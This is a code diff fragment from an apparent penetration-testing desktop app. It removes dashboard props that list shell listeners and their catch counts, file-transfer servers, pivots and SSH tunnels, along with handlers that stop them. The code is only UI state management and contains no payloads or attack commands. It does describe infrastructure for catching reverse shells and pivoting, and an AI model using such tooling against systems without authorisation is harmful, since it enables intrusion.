-            for (const p of vaultSummary.proxyProfiles || []) {
-              if (p.type === 'socks5' && p.socksAddress) {
-                if (!list.some((x) => x.addr === p.socksAddress)) {
-                  list.push({ label: p.name, addr: p.socksAddress });
-                }
-              }
-            }
-            return list;
-          })()}
-          suggestedTargetHosts={vaultSummary.hosts.map((h) => h.address).filter(Boolean)}
-          activeDashboardItems={(() => {
-            const items: DashboardListenerSnapshot[] = [];
-            for (const l of drawerListeners) {
-              items.push({
-                id: l.id,
-                sourceType: 'shell-listener',
-                name: l.name,
-                kind: `${l.tool} (${l.kind})`,
-                endpoint: `${l.bindAddress}:${l.bindPort}`,
-                status: l.status,
-                metaSummary: `Catches: ${l.catchCount || 0}`,
-              });
-            }
-            for (const srv of dashboardFileServers) {
-              items.push({
-                id: srv.id,
-                sourceType: 'transfer-server',
-                name: srv.name,
-                kind: srv.kind,
-                endpoint: `${srv.bindAddress}:${srv.port}`,
-                status: srv.status,
-                metaSummary: `Served: ${srv.servedCount || 0} · Uploads: ${srv.uploadCount || 0}`,
-              });
-            }
-            for (const p of drawerPivots) {
-              if (p.status === 'running') {
-                items.push({
-                  id: p.id,
-                  sourceType: 'pivot',
-                  name: p.name,
-                  kind: p.tool,
-                  endpoint: p.listenPort ? `${p.bindAddress}:${p.listenPort}` : p.tool,
-                  status: p.status,
-                });
-              }
-            }
-            for (const t of activeTunnels) {
-              if (t.status === 'active') {
-                items.push({
-                  id: t.id,
-                  sourceType: 'ssh-tunnel',
-                  name: `SSH -${t.type} :${t.bindPort}`,
-                  kind: `-${t.type}`,
-                  endpoint: `${t.bindAddress || '127.0.0.1'}:${t.bindPort}`,
-                  status: t.status,
-                });
-              }
-            }
-            return items;
-          })()}
-          onStopEndpoint={async (sourceType, id) => {
-            const api = getWailsBindings();
-            if (!api) return;
-            if (sourceType === 'shell-listener' && api.StopManagedListener) {
-              await api.StopManagedListener(id);
-              setDrawerListeners((prev) => prev.filter((x) => x.id !== id));
-            } else if (sourceType === 'transfer-server' && api.StopFileTransferServer) {
-              await api.StopFileTransferServer(id);
-              setDashboardFileServers((prev) => prev.filter((x) => x.id !== id));
-            } else if (sourceType === 'pivot' && api.StopPivotInstance) {
-              await api.StopPivotInstance(id);
-              setDrawerPivots((prev) => prev.filter((x) => x.id !== id));
-            } else if (sourceType === 'ssh-tunnel' && api.StopForwardTunnel) {
-              await api.StopForwardTunnel(id);
-              if (api.GetActiveTunnels) {
-                const tuns = await api.GetActiveTunnels();
-                setActiveTunnels(tuns || []);
-              }
-            }
-          }}
-          runHealthCheck={async (req) => {
-            const api = getWailsBindings();
-            if (api?.RunRouteHealthCheck) return api.RunRouteHealthCheck(req);
-            throw new Error('RunRouteHealthCheck API unavailable');
-          }}
-          onOpenPivotManager={() => setShowPivotManagerModal(true)}
-          onOpenPortForwarding={() => setShowPortForwardingModal(true)}
         />
       )}
 
